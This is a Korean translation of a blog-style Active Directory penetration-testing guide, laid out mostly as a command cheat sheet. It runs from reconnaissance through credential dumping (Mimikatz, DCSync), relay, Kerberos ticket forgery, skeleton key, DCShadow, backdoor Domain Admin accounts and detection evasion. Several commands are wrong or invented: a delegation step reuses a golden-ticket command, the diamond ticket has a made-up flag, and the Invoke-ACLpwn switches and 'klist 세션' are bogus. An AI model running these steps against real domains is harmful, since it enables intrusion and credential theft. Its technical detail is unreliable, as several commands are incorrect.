---
title: "펜테스팅에서의 Active Directory 방법론 포괄적인 가이드"
description: ""
coverImage: "/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png"
date: 2024-06-19 21:17
ogImage: 
  url: /assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png
tag: Tech
originalTitle: "Active Directory Methodology in Pentesting: A Comprehensive Guide"
link: "https://medium.com/@verylazytech/active-directory-methodology-in-pentesting-a-comprehensive-guide-fa7e8e5ff9d3"
---


요즘의 디지털 환경에서 Active Directory (AD)는 대부분의 기업 환경에서 네트워크 자원을 관리하는 중추 역할을 합니다. AD는 사용자, 컴퓨터 및 기타 자원을 관리하기 위한 중앙 집중화 및 구조화된 구조를 제공함으로써 복잡한 IT 시스템의 관리를 간편화합니다. 그 중요성을 고려할 때 Active Directory의 보안을 보장하는 것이 매우 중요합니다. 이 문서는 Active Directory의 세부 사항을 들여다보고 AD 환경을 펜테스팅하기 위한 포괄적인 방법론을 개요하고 있습니다. 초보자든 중급 보안 전문가든, 이 안내서는 Active Directory를 효과적으로 펜테스팅하고 취약성을 식별하며 조직의 전체적인 보안 체계를 강화하기 위한 지식과 도구를 제공합니다.

![Active Directory Methodology in Pentesting - A Comprehensive Guide](/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png)

## Active Directory 이해하기

## 주요 개념

<div class="content-ad"></div>

- 디렉터리: 디렉터리는 네트워크 내 객체에 대한 정보를 저장하는 계층적 구조입니다. AD에서 이 디렉터리는 사용자, 컴퓨터 및 기타 리소스에 대한 데이터를 저장하는 데 사용됩니다.
- 객체: 객체는 AD 내의 다양한 엔티티를 나타냅니다. 일반적인 객체에는 사용자, 그룹, 컴퓨터 및 프린터가 포함됩니다. 각 객체에는 사용자의 이름, 이메일, 비밀번호와 같은 속성이 있습니다.
- 도메인: 도메인은 동일한 AD 데이터베이스를 공유하는 객체들의 논리적 그룹입니다. 이는 보안 경계 역할을 하며 이러한 객체들의 중앙화된 관리를 제공합니다.
- 트리: 트리는 계층적 구조로 연결된 하나 이상의 도메인 모음입니다. 트리 내의 도메인은 연속적인 네임스페이스를 공유합니다.
- 포리스트: 포리스트는 AD에서 최상위 컨테이너이며 하나 이상의 트리로 구성됩니다. 포리스트 내의 트리는 공통 전역 카탈로그, 디렉터리 스키마 및 구성을 공유합니다.

# Active Directory 도메인 서비스 (AD DS)

AD DS는 Active Directory에서 제공하는 핵심 서비스로, 여러 중요 기능을 포함하고 있습니다:

- 도메인 서비스: 인증, 권한 부여 및 디렉터리 서비스를 제공합니다.
- 인증서 서비스: 안전한 통신을 위해 디지털 인증서를 발급하고 관리합니다.
- 경량 디렉터리 서비스: 전체 기능이 필요 없는 애플리케이션을 위한 AD DS의 간소화된 버전을 제공합니다.
- 디렉터리 페더레이션 서비스: 조직 경계를 넘어 단일 로그인(SSO) 기능을 제공합니다.
- 권리 관리: 암호화 및 정책 시행을 통해 민감한 데이터를 보호합니다.
- DNS 서비스: AD와 통합하여 이름 해결 서비스를 제공합니다.

<div class="content-ad"></div>

# Active Directory 펜테스팅: 방법론과 기술

# 자격 증명 또는 세션 없이 수행하는 정찰

본격적인 펜테스팅 활동에 들어가기 전에 수동으로 환경을 이해하는 것이 중요합니다. Nmap과 같은 도구를 사용하여 열린 포트와 서비스를 스캔할 수 있습니다. 또한 NetBIOS 및 DNS 열거를 통해 AD 구조 및 사용 가능한 호스트에 대한 유용한 통찰을 얻을 수 있습니다.

## 명령어:

<div class="content-ad"></div>

```bash
nmap -sP <대상_네트워크_범위>
nmap -p 88,135,139,389,445,636,3268,3269,3389 -sV -O <대상_IP>
nbtscan <대상_네트워크_범위>
nslookup -type=SRV _ldap._tcp.dc._msdcs.<도메인>
```

- Nmap
- nbtscan

# 사용자 열거

ldapsearch 또는 enum4linux와 같은 도구를 사용하여 사용자 열거를 할 수 있습니다. 이 도구들은 LDAP 및 SMB 프로토콜을 활용하여 사용자 및 그룹에 대한 정보를 수집합니다.

<div class="content-ad"></div>

## 명령어:

```js
ldapsearch -x -h <도메인_컨트롤러_IP> -b "dc=예제,dc=com" "(objectclass=user)"
enum4linux -U <대상_IP>
```

- ldapsearch
- enum4linux

# LLMNR/NBT-NS 독점공격

<div class="content-ad"></div>

LLMNR 및 NBT-NS 독려는 인증 요청을 캡처하고 중계하는 기술로 사용됩니다. Responder와 같은 도구를 사용하여 이러한 요청을 수신하고 해시를 캡처할 수 있으며, 이는 후속 공격에 사용될 수 있습니다.

## 명령어:

```js
sudo responder -I <네트워크_인터페이스>
```

- Responder

<div class="content-ad"></div>

# NTLM 릴레이

NTLM 릴레이 공격은 NTLM 해시를 캡처하고 다른 서비스로 릴레이하여 무단 액세스를 얻는 것을 의미합니다. NTLMRelayX는 이러한 공격을 수행하는 데 강력한 도구입니다.

## 명령어:

```js
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

<div class="content-ad"></div>

- NTLMRelayX

# 자격 증명 도용

Mimikatz와 같은 도구를 사용하여 메모리에서 평문 암호, 해시, PIN 코드 및 케르버로스 티켓을 추출하여 자격 증명 도용이 가능합니다.

## 명령어:

<div class="content-ad"></div>

```js
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

- Mimikatz

# 자격 증명 또는 세션을 사용하여 Active Directory 나열하기

한 번 자격 증명을 획득하면 BloodHound와 같은 도구를 사용하여 AD 환경을 매핑하고 관련성 및 잠재적인 공격 경로를 식별할 수 있습니다.

<div class="content-ad"></div>

## 명령어:

```js
SharpHound.exe -c All
```

- BloodHound

# Kerberoasting

<div class="content-ad"></div>

케로버로스팅은 SPN(서비스 주체 이름)에 대한 서비스 티켓을 요청하고 이를 오프라인으로 깨서 평문 암호를 얻는 방법입니다. 이 기술에는 Rubeus와 같은 도구가 일반적으로 사용됩니다.

## 명령어:

```js
Rubeus.exe kerberoast
```

- Rubeus

<div class="content-ad"></div>

# 원격 연결 (RDP, SSH, FTP, Win-RM)

원격 연결을 악용하려면 Metasploit이나 Cobalt Strike와 같은 도구를 사용하여 RDP, SSH, FTP 및 Win-RM과 같은 서비스를 통해 접근할 수 있습니다.

## 명령어:

```js
msfconsole
use exploit/windows/rdp/rdp_login
set RHOSTS <대상_ip>
set USERNAME <사용자명>
set PASSWORD <암호>
run
```

<div class="content-ad"></div>

- Metasploit

# 현재 세션 티켓

현재 세션 티켓을 분석하면, 하이재킹이나 측면 이동에 악용될 수 있는 활성 세션을 식별하는 데 도움이 됩니다.

## 명령어:

<div class="content-ad"></div>

```js
klist 세션
```

# 컴퓨터 공유에서 자격 증명 찾기

공유 폴더를 스캔하여 저장된 자격 증명을 확인하면 일반 텍스트 암호나 민감한 정보가 포함된 스크립트를 발견할 수 있습니다. SharpHound와 같은 도구를 사용하면 이 프로세스를 자동화할 수 있습니다.

## 명령어:

<div class="content-ad"></div>

```js
SharpHound.exe -c Shares
```

- SharpHound

# 특정 Exploits

## CVE-2021–1675 (PrintNightmare)

<div class="content-ad"></div>

프린트 악몽(PrintNightmare)은 프린트 스풀러 서비스의 취약점을 악용하는 악용 프로그램입니다. PrintNightmare과 같은 도구는 이를 이용하여 권한 상승을 얻습니다.

## 명령어:

```js
PrintNightmare.exe <대상_ip>
```

- PrintNightmare

<div class="content-ad"></div>

## CVE-2021–34527 (프린트 나이트메어)

이것은 프린트 나이트메어 취약점의 다른 변형입니다. 적절한 패치 관리와 중요 서버에서 프린트 스풀러 서비스를 비활성화하면 이 위험을 완화할 수 있습니다.

## 명령어:

```js
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

<div class="content-ad"></div>

# 핵심 펜테스팅 기법에 대한 단계별 안내서

# 특권 자격 증명/세션을 이용한 Active Directory 권한 상승

- BloodHound와 같은 도구를 사용하여 취약 경로를 식별합니다.

```js
SharpHound.exe -c All
```

<div class="content-ad"></div>

2. 토큰 위조 또는 서비스 남용과 같은 기술을 사용하여 경로를 악용합니다.

```js
mimikatz.exe "privilege::debug" "token::elevate" "exit"
```

3. 제한된 리소스에 액세스하려고 시도하여 액세스를 확인합니다.

```js
dir \\<target_ip>\c$
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

<div class="content-ad"></div>

3. 해시를 추출하려면 sekurlsa::logonpasswords 명령을 실행하세요.

- 추출된 해시를 안전하게 저장하여 나중에 사용하세요.

# 패스 더 해시

- 대상 계정의 NTLM 해시를 획득하세요.
- 해당 해시를 Mimikatz나 Pass-the-Hash Toolkit과 같은 도구와 함께 사용하여 평문 암호 없이 인증하세요.

<div class="content-ad"></div>


mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe" "exit"


# 해시/키 전달하기

- Mimikatz와 같은 도구를 사용하여 Kerberos 키를 추출합니다.


mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "exit"


<div class="content-ad"></div>

2. 키를 사용하여 Kerberos 티켓을 요청하고 인증하세요.

```js
mimikatz.exe "kerberos::ptt <ticket.kirbi>"
```

# 티켓 전달

- Mimikatz를 사용하여 Kerberos 티켓을 추출하세요.

<div class="content-ad"></div>

```js
mimikatz.exe "kerberos::list" "kerberos::ptt <ticket.kirbi>" "exit"
```

2. Mimikatz를 사용하여 현재 세션에 티켓을 삽입합니다.

# 자격 증명 재사용

- 다른 서비스 간에 재사용된 자격 증명 식별
- 획득한 자격 증명을 사용하여 다른 서비스에서 인증합니다.

<div class="content-ad"></div>

# MSSQL 남용 및 신뢰할 수 있는 링크

- 네트워크 내 MSSQL 서버 식별

```js
sqlcmd -L
```

2. 명령 실행 또는 데이터 검색을 위해 신뢰할 수 있는 링크 악용.

<div class="content-ad"></div>

```js
sqlcmd -S <대상_서버> -U <사용자_이름> -P <암호>
```

# 제약이 없는 위임

- 제약이 없는 위임이 설정된 계정을 식별합니다.

```js
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

<div class="content-ad"></div>

2. 계정을 위장하여 위임을 남용하십시오.

```js
mimikatz.exe "kerberos::golden /domain:<도메인> /sid:<도메인SID> /target:<대상서비스> /rc4:<서비스계정해시> /user:<대상사용자> /service:<서비스명> /target:<대상FQDN>" "exit"
```

# 제한된 위임

- 위임이 허용된 서비스 식별하기.

<div class="content-ad"></div>

```js
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne $null} -Properties msDS-AllowedToDelegateTo
```

서비스 계정을 탈취하여 위임을 악용하십시오.

# 리소스 기반 제한된 위임

- 리소스 기반 위임 설정 식별하기.

<div class="content-ad"></div>

```js
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

2. 권한 상승을 얻기 위해 설정을 악용하세요.

# ACL 악용

- BloodHound와 같은 도구를 사용하여 ACL 열거.

<div class="content-ad"></div>

```js
SharpHound.exe -c All
```

2. 추가 권한을 부여하려면 ACL을 수정하세요.

```js
Invoke-ACLpwn -Domain <도메인> -Principal <사용자> -AddFullControl
```

# 프린터 스풀러 서비스 남용

<div class="content-ad"></div>

- 알려진 취약점을 이용하여 프린트 스풀러 서비스를 악용합니다.
- 해당 서비스를 악용하여 권한을 상승시킵니다.

```js
PrintNightmare.exe <대상_ip>
```

# 타사 세션 남용

- 활성 타사 세션을 식별합니다.

<div class="content-ad"></div>

```js
klist 세션
```

2. 불허된 접근 권한을 얻기 위해 세션을 해킹하세요.

# LAPS

- AD에 저장된 LAPS 비밀번호를 검색하세요.


<div class="content-ad"></div>

```ps
Get-ADComputer -Filter * -Property "ms-MCS-AdmPwd" | Select-Object Name, "ms-MCS-AdmPwd"
```

2. 지역 관리자 계정에 접근하기 위해 비밀번호를 사용하세요.

# 인증서 도난

- AD에 저장된 인증서를 식별하세요.

<div class="content-ad"></div>

```js
certutil -store -user My
```

2. Certify와 같은 도구를 사용하여 인증서를 추출하세요.

```js
Certify.exe find /type:domain
```

# 인증서 템플릿 남용


<div class="content-ad"></div>

- 자격증 템플릿 나열하기

```js
certutil -TCAInfo
```

- 설정이 잘못된 템플릿을 남용하여 상위 권한 획득하기

```js
Certify.exe request /ca:<CA Name> /template:<Template Name>
```

<div class="content-ad"></div>

# 고 권한 계정으로 Post-Exploitation

- DCSync와 같은 도구를 사용하여 도메인 자격 증명 덤프하기.

```js
mimikatz.exe "lsadump::dcsync /domain:<도메인> /user:<사용자>" "exit"
```

2. 새 계정 생성 또는 그룹 멤버쉽 수정을 통해 권한 상승하기.

<div class="content-ad"></div>

```js
net user <username> <password> /add
net group "Domain Admins" <username> /add
```

# 도메인 자격 증명 덤프

- Mimikatz를 사용하여 DCSync 실행.

```js
mimikatz.exe "lsadump::dcsync /domain:<domain> /user:<user>" "exit"
```

<div class="content-ad"></div>

2. 덤프된 자격 증명은 안전하게 저장하세요.

# 권한 상승 및 지속성

- 백도어 계정 생성을 통해 액세스 유지

```js
net user <username> <password> /add
```

<div class="content-ad"></div>

2. 보안 설명자를 수정하여 지속성을 확보합니다.

```js
Set-ACL -경로 "AD:<경로>" -ACLObject $acl
```

# 실버 티켓

- 서비스 계정 해시를 사용하여 실버 티켓을 생성합니다.

<div class="content-ad"></div>

```js
mimikatz.exe "kerberos::golden /domain:<도메인> /sid:<도메인_SID> /target:<대상_서비스> /rc4:<서비스_계정_해시> /user:<대상_사용자> /service:<서비스_이름> /target:<대상_FQDN>" "exit"
```

2. 도메인 컨트롤러와 통신하지 않고 서비스에 인증합니다.

# 골든 티켓

- KRBTGT 계정 해시를 추출합니다.

<div class="content-ad"></div>

```js
mimikatz.exe "lsadump::dcsync /domain:<도메인> /user:krbtgt" "exit"
```

2. 도메인 관리자 권한을 얻기 위해 골든 티켓 생성.

```js
mimikatz.exe "kerberos::golden /user:<사용자이름> /domain:<도메인> /sid:<도메인SID> /krbtgt:<krbtgt 해시> /id:<사용자ID> /groups:<그룹ID들>" "exit"
```

# 다이아몬드 티켓


<div class="content-ad"></div>

- 특별 권한이 있는 다이아몬드 티켓을 만들어보세요.

```js
mimikatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:<user_id> /groups:<group_ids> /extra:<extra_privileges>" "exit"
```

2. 네트워크 내에서 특정 작업에 해당 티켓을 사용하세요.

# 인증서 계정 지속성

<div class="content-ad"></div>

- 지속성을 유지하기 위해 인증서 템플릿을 남용하지 않도록 주의하세요.

```js
Certify.exe request /ca:<CA Name> /template:<Template Name>
```

2. 인증서를 다시 발급하여 계속된 액세스를 보장하세요.

```js
Certify.exe renew /id:<cert_id>
```

<div class="content-ad"></div>

# 인증서 도메인 지속성

- 도메인 인증서를 수정하여 상위 액세스를 유지하세요.
- 주기적으로 인증서를 갱신하여 지속적인 액세스를 보장하세요.

```js
Certify.exe renew /id:<cert_id>
```

# AdminSDHolder 그룹

<div class="content-ad"></div>

- AdminSDHolder 그룹 설정을 수정합니다.

```js
Set-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=<도메인>,DC=com" -Replace @{adminCount=1}
```

2. 변경 사항이 전파되도록 상위 권한을 유지합니다.

```js
Set-ADUser -Identity <사용자이름> -Replace @{adminCount=1}
```

<div class="content-ad"></div>

# DSRM 자격 증명

- 도메인 컨트롤러에서 DSRM 자격 증명을 검색합니다.

```js
ntdsutil "set dsrm password" "reset password on server <서버명>" "quit"
```

2. 이 자격 증명을 사용하여 디렉터리 서비스 복원 모드(Directory Services Restore Mode)에서 DC에 액세스합니다.

<div class="content-ad"></div>

# ACL 지속성

- 접근을 유지하기 위해 ACL을 수정하세요.

```js
Invoke-ACLpwn -Domain <도메인> -Principal <사용자> -AddFullControl
```

2. 변경 내용이 삭제되지 않도록 보호하여 지속성을 보장하세요.

<div class="content-ad"></div>

# 보안 기술자

- 잘못된 설정을 위한 보안 기술자 분석

```js
Get-ACL -Path "AD:<경로>"
```

2. 특권 상승을 위해 잘못된 설정을 이용하세요.

<div class="content-ad"></div>

```js
Set-ACL -Path "AD:<경로>" -ACLObject $acl
```

# 스켈레톤 키

- 도메인 컨트롤러에 스켈레톤 키를 배포합니다.

```js
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
```

<div class="content-ad"></div>

2. 마스터 암호를 사용하여 모든 계정을 인증하세요.

# 사용자 정의 SSP

- 사용자 정의 보안 지원 공급자를 설치하세요.
- SSP를 사용하여 인증 프로세스를 캡처하거나 조작하세요.

# DCShadow

<div class="content-ad"></div>

- DCShadow를 사용하여 로그인 DC를 등록하세요.

```js
mimikatz.exe "privilege::debug" "lsadump::dcshadow /push" "exit"
```

2. 수정된 객체 및 권한을 조작하기 위해 AD 데이터베이스에 변경 사항을 푸시하세요.

```js
mimikatz.exe "privilege::debug" "lsadump::dcshadow /update" "exit"
```

<div class="content-ad"></div>

# LAPS 지속성

- 액세스를 유지하는 데 LAPS 설정을 활용하세요.

```js
Get-ADComputer -Filter * -Property "ms-MCS-AdmPwd" | Select-Object Name, "ms-MCS-AdmPwd"
```

2. 주기적으로 암호를 업데이트하고 검색하여 지속성을 보장하세요.

<div class="content-ad"></div>

# Forest Privilege Escalation — Domain Trusts

- 상호도메인 신뢰를 식별합니다.

```js
Get-ADTrust -Filter *
```

숲 전체에서 권한을 상승시키기 위해 신뢰 관계를 악용하세요.

<div class="content-ad"></div>

# 초보자를 위한 팁

# 피해야 할 흔한 실수

- **정찰 건너뛰기:** 환경을 이해하기 위해 철저한 정찰이 중요합니다.
- **패치 관리 무시하기:** 환경이 패치로 최신 상태인지 확인하세요.
- **권한 상승 경로 간과하기:** BloodHound와 같은 도구를 사용하여 모든 가능한 경로를 식별하고 악용하세요.

# 도전과 해결책

<div class="content-ad"></div>

- AD 환경의 복잡성: 환경을 더 작은 세그먼트로 나누어 각각을 철저히 분석하십시오.
- 보안 시스템에 의한 탐지: 탐지를 최소화하는 은밀한 기술과 도구를 사용하십시오.
- 문서화 부족: 과정과 결과를 이해하기 위해 각 단계를 신중하게 문서화하십시오.

Active Directory 펜테스팅은 AD 구조 및 서비스에 대한 심층적인 이해와 취약점을 식별하고 악용하는 방법론적인 접근이 필요한 복합적인 작업입니다. 이 문서에서 소개된 포괄적인 방법론을 따르면 시스템적으로 취약점을 발견하고 권한을 상승시키며 AD 환경의 보안을 극대화할 수 있습니다. 경험을 쌓으면서 기술을 더욱 정교하게 개선하고 새로운 취약성과 악용 방법을 파악하는 것이 중요합니다. AD 펜테스팅은 결함을 찾는 데 그치는 것이 아니라 IT 인프라의 보안과 유연성에 기여하는 것입니다.

Active Directory의 보안을 확보하는 것은 조직의 IT 환경 전반의 안전에 중요합니다. 철저한 펜테스트를 수행하고 식별된 취약점에 대처함으로써 조직은 가치 있는 자산을 보호하고 강력한 보안 자세를 유지할 수 있습니다.

📎 커피 한 잔 사주세요